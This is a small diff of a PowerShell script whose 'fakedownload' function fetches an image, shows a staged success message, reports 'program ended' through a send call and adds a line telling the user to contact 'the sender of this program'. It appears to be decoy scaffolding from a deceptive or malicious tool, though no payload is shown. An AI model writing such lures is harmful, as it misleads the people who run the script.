@@ -57,6 +57,7 @@ function fakedownload {
     $OutputFilePath = "$ppath\image.jpg"
 
     Invoke-WebRequest -Uri $ImageURL -OutFile $OutputFilePath
+    Write-Host "report any errors back to the sender of this program`n"
     Write-Host "`nsuccessfully downloaded, program will close shortly" -ForegroundColor 'Green'
     send -msg "program ended"
     Start-Sleep -Milliseconds 5000
